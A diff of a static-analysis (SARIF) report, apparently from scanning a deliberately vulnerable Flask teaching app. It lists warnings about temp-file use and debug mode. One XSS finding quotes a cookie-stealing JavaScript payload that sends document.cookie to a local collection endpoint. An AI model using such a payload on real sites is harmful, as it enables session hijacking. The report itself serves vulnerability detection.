+            "glog-pfp-ruleFileLineCode/v1": "72c4fdb4adcbb0bca23e0184bc19f1032cac40e9aec47ca4bc5750815b4cac0f",
+            "glog-pfp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
+          },
           "fingerprints": {
-            "matchBasedId/v1": "79f9f842928a5f35160b6e98c6f3c78e06c2a652e4393ed7e892d2daf899becf6c5f2e1915cf5a157e20bde39c6b1caf8176597206f3bb32a7740e8450b8a822_0"
+            "glog-fp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
           },
           "properties": {}
         },
@@ -3046,50 +3135,6 @@
           },
           "fingerprints": {
             "glog-fp-ruleFileCode/v1": "6ed85d76567599e8fb710d19ed3653b40e57239fb9f3a7caaedfcdc532f0b934"
-          },
-          "properties": {
-            "issue_severity": "MEDIUM",
-            "issue_confidence": "MEDIUM"
-          }
-        },
-        {
-          "ruleId": "2cb06702-8e2a-3d19-b644-a78b05423288",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Potential Unsafe Use of Temporary File/Directory"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/api_post.py"
-                },
-                "region": {
-                  "startLine": 6,
-                  "startColumn": 21,
-                  "endLine": 6,
-                  "endColumn": 43,
-                  "snippet": {
-                    "text": "api_key_file = Path('/tmp/supersecret.txt')\n"
-                  }
-                },
-                "contextRegion": {
-                  "startLine": 5,
-                  "endLine": 7,
-                  "snippet": {
-                    "text": "\napi_key_file = Path('/tmp/supersecret.txt')\n\n"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "d21dead62378defecbd1596907c4ddc8d0c419971afed5af6b44102111e84238",
-            "glog-pfp-ruleFileCode/v1": "018562b46e2b6c58f657f065467b631e2910d96c162fb6879e44ff9d6b2212d5"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "018562b46e2b6c58f657f065467b631e2910d96c162fb6879e44ff9d6b2212d5"
           },
           "properties": {
             "issue_severity": "MEDIUM",
@@ -3176,42 +3221,51 @@
           }
         },
         {
-          "ruleId": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
+          "ruleId": "2cb06702-8e2a-3d19-b644-a78b05423288",
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
+            "text": "Potential Unsafe Use of Temporary File/Directory"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "good/payloads/cookie.js",
-                  "uriBaseId": "%SRCROOT%"
+                  "uri": "bad/api_post.py"
                 },
                 "region": {
-                  "startLine": 1,
-                  "startColumn": 1,
-                  "endLine": 1,
-                  "endColumn": 69,
+                  "startLine": 6,
+                  "startColumn": 21,
+                  "endLine": 6,
+                  "endColumn": 43,
                   "snippet": {
-                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
+                    "text": "api_key_file = Path('/tmp/supersecret.txt')\n"
+                  }
+                },
+                "contextRegion": {
+                  "startLine": 5,
+                  "endLine": 7,
+                  "snippet": {
+                    "text": "\napi_key_file = Path('/tmp/supersecret.txt')\n\n"
                   }
                 }
               }
             }
           ],
           "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "72c4fdb4adcbb0bca23e0184bc19f1032cac40e9aec47ca4bc5750815b4cac0f",
-            "glog-pfp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
+            "glog-pfp-ruleFileLineCode/v1": "d21dead62378defecbd1596907c4ddc8d0c419971afed5af6b44102111e84238",
+            "glog-pfp-ruleFileCode/v1": "018562b46e2b6c58f657f065467b631e2910d96c162fb6879e44ff9d6b2212d5"
           },
           "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
+            "glog-fp-ruleFileCode/v1": "018562b46e2b6c58f657f065467b631e2910d96c162fb6879e44ff9d6b2212d5"
           },
-          "properties": {}
+          "properties": {
+            "issue_severity": "MEDIUM",
+            "issue_confidence": "MEDIUM"
+          }
         },
         {
-          "ruleId": "8fdc682e-a47e-338e-a4d6-13373398e33f",
+          "ruleId": "563d99e8-bbca-3a4d-b821-042b6999c80e",
           "kind": "fail",
           "level": "warning",
           "message": {
@@ -3225,9 +3279,9 @@
                 },
                 "region": {
                   "startLine": 29,
-                  "startColumn": 52,
+                  "startColumn": 70,
                   "endLine": 29,
-                  "endColumn": 68,
+                  "endColumn": 85,
                   "snippet": {
                     "text": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n"
                   }
@@ -3243,11 +3297,11 @@
             }
           ],
           "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "41262a7563c5d3f680c0933ccf94908e09c7e341f10f725487709b49bbbb1061",
-            "glog-pfp-ruleFileCode/v1": "fe418a42ecefb1eab3c22b5e2316b90cb4e019ea9ad9eda1eb1d1059e9fb9a2c"
+            "glog-pfp-ruleFileLineCode/v1": "fc1a963d2e3647589d1f4006e781afac5371fb51bc0235974d5eb8017bb83957",
+            "glog-pfp-ruleFileCode/v1": "60f3f4d1f309eb9798e2b279649b23075835bc46941a3633e7a27e00613d86ae"
           },
           "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "fe418a42ecefb1eab3c22b5e2316b90cb4e019ea9ad9eda1eb1d1059e9fb9a2c"
+            "glog-fp-ruleFileCode/v1": "60f3f4d1f309eb9798e2b279649b23075835bc46941a3633e7a27e00613d86ae"
           },
           "properties": {
             "issue_severity": "MEDIUM",
@@ -3339,6 +3393,50 @@
           },
           "properties": {
             "issue_severity": "MEDIUM",
+            "issue_confidence": "MEDIUM"
+          }
+        },
+        {
+          "ruleId": "46755491-b0f8-316f-a803-209b104c5c01",
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Flask App Debug Mode Vulnerability"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/vulpy.py"
+                },
+                "region": {
+                  "startLine": 53,
+                  "startColumn": 1,
+                  "endLine": 53,
+                  "endColumn": 72,
+                  "snippet": {
+                    "text": "app.run(debug=True, host='127.0.1.1', port=5001, extra_files='csp.txt')\n"
+                  }
+                },
+                "contextRegion": {
+                  "startLine": 52,
+                  "endLine": 54,
+                  "snippet": {
+                    "text": "\napp.run(debug=True, host='127.0.1.1', port=5001, extra_files='csp.txt')\n\n"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "1adb89c7293dadb503941494d83f440b895842f570fb7a1814ac66b27fbd2161",
+            "glog-pfp-ruleFileCode/v1": "602c7c15f32f9b4bc18351c97b1eb823c40b07004df62f4e0b7e3d893e17179b"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "602c7c15f32f9b4bc18351c97b1eb823c40b07004df62f4e0b7e3d893e17179b"
+          },
+          "properties": {
+            "issue_severity": "HIGH",
             "issue_confidence": "MEDIUM"
           }
         }
